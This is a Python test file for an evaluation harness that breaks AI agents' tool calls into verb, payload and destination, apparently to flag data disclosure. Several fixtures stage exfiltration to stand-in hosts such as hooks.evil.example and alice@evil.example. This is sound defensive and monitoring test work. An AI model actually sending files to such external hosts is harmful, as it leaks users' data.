"""eval.effects_v2.describe_parts: (verb, payload, destination) decomposition for all 13 tools."""
import copy

import pytest

from eval import effects as E
from eval.effects_v2 import describe_parts
from eval.trace_schema import TOOLS

SAMPLE_ARGS = {
    "read_file": {"path": "/project/report.csv"},
    "write_file": {"path": "/project/out.md", "content": "hello"},
    "delete_file": {"path": "/project/old.log"},
    "list_directory": {"path": "/project/src"},
    "search_files": {"pattern": "TODO", "path": "/project"},
    "send_email": {"to": "bob@team.com", "subject": "hi", "body": "meeting at 3"},
    "send_slack_message": {"channel": "#internal-ops", "message": "deploy done"},
    "post_to_webhook": {"url": "https://hooks.team.com/ci", "payload": "build"},
    "query_database": {"query": "active_tasks"},
    "update_task": {"task_id": 3, "status": "done"},
    "create_task": {"title": "Fix bug", "assignee": "Alice", "priority": "high"},
    "run_shell_command": {"command": "git status"},
    "create_github_issue": {"title": "Bug", "body": "it breaks", "labels": ["bug"]},
}


def test_covers_all_13_tools_and_shape():
    assert set(SAMPLE_ARGS) == TOOLS
    for tool, args in SAMPLE_ARGS.items():
        parts = describe_parts(tool, args)
        assert isinstance(parts, tuple) and len(parts) == 3
        assert all(isinstance(p, str) for p in parts), tool
        assert parts[0] and "\n" not in "".join(parts)


@pytest.mark.parametrize("tool", sorted(SAMPLE_ARGS))
def test_verb_matches_describe_effect_conventions(tool):
    verb = describe_parts(tool, SAMPLE_ARGS[tool])[0]
    assert E.describe_effect(tool, SAMPLE_ARGS[tool]).startswith(verb + " ")


def test_external_email_and_webhook_parts():
    assert describe_parts("send_email", {"to": "p@acme.example", "subject": "s", "body": "report.csv"}) == \
        ("Disclose", "report.csv", "p@acme.example")
    v, p, d = describe_parts("post_to_webhook", {"url": "https://hooks.evil.example/x", "payload": "report.csv"})
    assert (v, p) == ("Disclose", "report.csv") and d == "hooks.evil.example/x"


def test_internal_looking_relay_keeps_path_in_destination():
    v, p, d = describe_parts("post_to_webhook", {"url": "https://relay.team.com/relay/acme-corp", "payload": "q3"})
    assert v == "Send" and "relay/acme-corp" in d and d.startswith("relay.team.com")


def test_email_falls_back_to_subject_and_slack_dest_is_channel():
    assert describe_parts("send_email", {"to": "a@team.com", "subject": "Invoice"})[1] == "Invoice"
    assert describe_parts("send_slack_message", {"channel": "#acme-share", "message": "figs"}) == \
        ("Disclose", "figs", "#acme-share")


def test_write_file_stage_vs_write():
    assert describe_parts("write_file", {"path": "/shared/x.csv", "content": "c"}) == ("Stage", "c", "/shared/x.csv")
    assert describe_parts("write_file", {"path": "/project/outbox/acme/x.csv", "content": "c"})[0] == "Write"


def test_shell_destination_is_external_host_else_local():
    v, p, d = describe_parts("run_shell_command", {"command": "curl -O https://dl.example.org/pkg.tgz"})
    assert v == "Run" and "curl" in p and d == "dl.example.org"
    assert describe_parts("run_shell_command", {"command": "ls /project"})[2] == "local shell"


def test_create_task_title_is_payload_assignee_is_destination():
    v, p, d = describe_parts("create_task", {"title": "Send Q3 deck to Acme", "assignee": "bob"})
    assert (v, p) == ("Create", "Send Q3 deck to Acme") and "bob" in d


def test_payload_truncated_but_keeps_file_names():
    long = "x" * 300 + " final_report.csv"
    p = describe_parts("send_email", {"to": "a@b.example", "body": long})[1]
    assert len(p) <= E.GIST_LIMIT + 60 and "final_report.csv" in p


def test_unknown_tool_and_garbage_args_do_not_raise():
    v, p, d = describe_parts("teleport", {"x": 1})
    assert v == "Run" and "x=1" in p
    assert describe_parts("teleport", {})[0] == "Run"
    for tool in TOOLS:
        assert isinstance(describe_parts(tool, None), tuple)
        assert isinstance(describe_parts(tool, {}), tuple)


def test_args_not_mutated_and_effects_module_untouched():
    a = copy.deepcopy(SAMPLE_ARGS)
    for t, args in SAMPLE_ARGS.items():
        describe_parts(t, args)
    assert a == SAMPLE_ARGS
    assert E.describe_effect("send_email", {"to": "alice@evil.example", "subject": "s", "body": "report.csv contents"}) \
        == "Disclose report.csv contents to external recipient alice@evil.example."
